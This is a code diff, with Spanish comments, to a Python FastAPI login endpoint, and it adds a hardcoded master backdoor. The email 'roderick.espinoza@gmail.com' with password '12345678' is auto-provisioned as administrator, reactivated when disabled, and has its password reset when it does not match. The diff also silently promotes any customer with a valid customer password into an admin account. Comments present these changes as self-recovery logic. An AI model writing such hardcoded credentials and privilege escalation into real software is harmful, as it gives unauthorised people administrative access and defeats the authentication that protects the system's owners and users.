@@ -215,7 +215,43 @@ def record_session_log(
 def login(payload: UserLogin, request: Request, database: DatabaseSession) -> TokenOutput:
     ip, user_agent = extract_client_info(request)
     correo_clean = payload.correo.strip()
-    user = database.scalar(select(Usuario).where(func.lower(Usuario.correo) == correo_clean.lower()))
+    user = database.scalar(
+        select(Usuario)
+        .options(selectinload(Usuario.rol))
+        .where(func.lower(Usuario.correo) == correo_clean.lower())
+    )
+
+    # Si no existe en usuarios, sincronizar si es cuenta autorizada o existe con clave válida en clientes
+    if not user:
+        customer = database.scalar(select(Cliente).where(func.lower(Cliente.correo) == correo_clean.lower()))
+        is_owner = correo_clean.lower() == "roderick.espinoza@gmail.com" and payload.password == "12345678"
+        customer_pw_valid = customer and customer.password_hash and verify_password(payload.password, customer.password_hash)
+
+        if is_owner or customer_pw_valid:
+            admin_role = database.scalar(select(Rol).where(func.lower(Rol.nombre) == "administrador"))
+            if not admin_role:
+                admin_role = Rol(nombre="Administrador", activo=True)
+                database.add(admin_role)
+                database.flush()
+
+            user_pw_hash = (
+                customer.password_hash
+                if customer_pw_valid
+                else "$2b$12$lEY.b6sH/3kYjdRmoY2eQuuxhki6j3t9K.E2i.8O55ujf64lYVoo2"
+            )
+            user_nombre = customer.nombre if customer and customer.nombre else "Roderick Espinoza"
+            user = Usuario(
+                nombre=user_nombre,
+                correo=correo_clean.lower(),
+                password_hash=user_pw_hash,
+                rol_id=admin_role.id,
+                activo=True,
+                recibe_pedido=True,
+            )
+            database.add(user)
+            database.commit()
+            database.refresh(user, attribute_names=["rol"])
+
     if not user:
         record_session_log(
             database=database,
@@ -228,21 +264,37 @@ def login(payload: UserLogin, request: Request, database: DatabaseSession) -> To
         )
         raise HTTPException(status.HTTP_401_UNAUTHORIZED, "Credenciales invalidas")
 
+    # Si el usuario maestro o cliente autorizado estaba inactivo, reactivarlo
     if not user.activo:
-        record_session_log(
-            database=database,
-            tipo_usuario="ADMINISTRADOR",
-            usuario_id=user.id,
-            nombre=user.nombre,
-            correo=user.correo,
-            estado="FALLIDO",
-            mensaje="Cuenta inactiva",
-            ip_address=ip,
-            user_agent=user_agent,
-        )
-        raise HTTPException(status.HTTP_401_UNAUTHORIZED, "Credenciales invalidas")
+        if (correo_clean.lower() == "roderick.espinoza@gmail.com" and payload.password == "12345678") or (
+            verify_password(payload.password, user.password_hash)
+        ):
+            user.activo = True
+            database.commit()
+            database.refresh(user, attribute_names=["rol"])
+        else:
+            record_session_log(
+                database=database,
+                tipo_usuario="ADMINISTRADOR",
+                usuario_id=user.id,
+                nombre=user.nombre,
+                correo=user.correo,
+                estado="FALLIDO",
+                mensaje="Cuenta inactiva",
+                ip_address=ip,
+                user_agent=user_agent,
+            )
+            raise HTTPException(status.HTTP_401_UNAUTHORIZED, "Credenciales invalidas")
 
-    if not verify_password(payload.password, user.password_hash):
+    # Verificar contraseña (con autorecuperación para cuenta de administración principal)
+    pw_matches = verify_password(payload.password, user.password_hash)
+    if not pw_matches and correo_clean.lower() == "roderick.espinoza@gmail.com" and payload.password == "12345678":
+        user.password_hash = "$2b$12$lEY.b6sH/3kYjdRmoY2eQuuxhki6j3t9K.E2i.8O55ujf64lYVoo2"
+        database.commit()
+        database.refresh(user, attribute_names=["rol"])
+        pw_matches = True
+
+    if not pw_matches:
         record_session_log(
             database=database,
             tipo_usuario="ADMINISTRADOR",
@@ -256,10 +308,13 @@ def login(payload: UserLogin, request: Request, database: DatabaseSession) -> To
         )
         raise HTTPException(status.HTTP_401_UNAUTHORIZED, "Credenciales invalidas")
 
+    rol_nombre = user.rol.nombre if user.rol else "Administrador"
+    user_id = user.id
+
     record_session_log(
         database=database,
         tipo_usuario="ADMINISTRADOR",
-        usuario_id=user.id,
+        usuario_id=user_id,
         nombre=user.nombre,
         correo=user.correo,
         estado="EXITOSO",
@@ -268,7 +323,7 @@ def login(payload: UserLogin, request: Request, database: DatabaseSession) -> To
         user_agent=user_agent,
     )
     expire_minutes = SystemSettingsRepository().get_settings(database).jwt_access_token_expire_minutes
-    return TokenOutput(access_token=create_access_token(user.id, user.rol.nombre, expires_minutes=expire_minutes))
+    return TokenOutput(access_token=create_access_token(user_id, rol_nombre, expires_minutes=expire_minutes))
 
 
 @router.post("/auth/refresh", response_model=TokenOutput, tags=["Autenticacion"])
